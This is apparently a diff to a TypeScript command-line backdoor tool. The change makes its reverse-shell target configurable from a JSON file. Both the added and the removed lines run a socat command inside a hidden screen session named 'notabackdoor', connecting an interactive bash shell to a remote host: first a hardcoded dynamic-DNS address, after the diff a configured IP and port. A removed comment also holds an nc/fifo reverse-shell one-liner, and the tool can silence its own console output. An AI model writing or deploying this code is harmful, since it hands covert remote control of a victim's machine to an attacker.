@@ -12,7 +12,11 @@ import {windowClear, sleep} from './helpers';
 import {readFileSync} from 'fs';
 const json: {
   remoteShell?: {
-// import child from 'child_process';
+    ip?: string;
+    port?: number;
+  };
+  // eslint-disable-next-line @typescript-eslint/no-var-requires
+} = JSON.parse(readFileSync('build/config.json').toString());
 const argv = yargs
   .usage('Usage: run `$0` and select what ya wanna do')
   .alias('d', 'default')
@@ -20,9 +24,7 @@ const argv = yargs
   .describe('d', 'Use the config.json in the ~/.backdoor/ directory').argv;
 if (argv.default) console.log = () => {};
 else windowClear();
-console.log(argv);
 
-windowClear();
 (async () => {
   console.log(
     `+-------------------------------------------+
@@ -86,7 +88,7 @@ windowClear();
         ) {
           await exec('screen -s sh -dmS notabackdoor');
           await exec(
-            'screen -S notabackdoor -p 0 -X stuff "socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:jabster28.myddns.me:5555; exit\n"'
+            `screen -S notabackdoor -p 0 -X stuff "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${json.remoteShell?.ip}:${json.remoteShell?.port}; exit\n"`
           );
         } else {
           return;
@@ -139,11 +141,10 @@ windowClear();
               'Paste the payload file path here (or drag it & drop it into the terminal window)'
             );
         }
-        // nc localhost 5555 < myfifo | /bin/bash -s "fish; exit" -i > myfifo 2>&1
         console.log(boxen('Making a daemonised screen...'));
         await exec('screen -s sh -dmS notabackdoor');
         await exec(
-          'screen -S notabackdoor -p 0 -X stuff "socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:jabster28.myddns.me:5555; exit\n"'
+          `screen -S notabackdoor -p 0 -X stuff "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${json.remoteShell?.ip}:${json.remoteShell?.port}; exit\n"`
         );
         console.log(boxen('Done!', {padding: 1}).green);
         if (daemon) {
